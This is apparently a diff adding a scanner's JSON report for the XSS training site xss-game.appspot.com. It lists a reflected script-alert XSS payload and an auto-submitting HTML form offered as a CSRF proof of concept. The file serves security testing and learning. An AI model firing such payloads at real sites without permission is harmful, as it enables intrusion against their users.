@@ -1,0 +1,35 @@
+{
+    "target": "xss-game.appspot.com",
+    "scan_date": "2025-03-02 23:17:52",
+    "results": {
+        "xss_scan": {
+            "xss_tests": {
+                "urls": [],
+                "forms": [
+                    {
+                        "url": "https://xss-game.appspot.com/level1/frame?query=<script>alert('XSS')</script>",
+                        "payload": "<script>alert('XSS')</script>"
+                    }
+                ],
+                "cookies": []
+            }
+        },
+        "csrf_scan": {
+            "csrf_tests": {
+                "forms": [
+                    {
+                        "form_action": "https://xss-game.appspot.com/level1/frame",
+                        "csrf_protected": false,
+                        "poc": "\n        <html>\n        <body>\n        <form action=\"https://xss-game.appspot.com/level1/frame\" method=\"get\">\n                <input type=\"hidden\" name=\"query\" value=\"Enter query here...\">\n\n            <input type=\"submit\" value=\"Submit\">\n        </form>\n        <script>document.forms[0].submit();</script>\n        </body>\n        </html>\n    "
+                    }
+                ],
+                "requests": [
+                    {
+                        "url": "https://xss-game.appspot.com/level1/frame",
+                        "csrf_vulnerable": true
+                    }
+                ]
+            }
+        }
+    }
+}
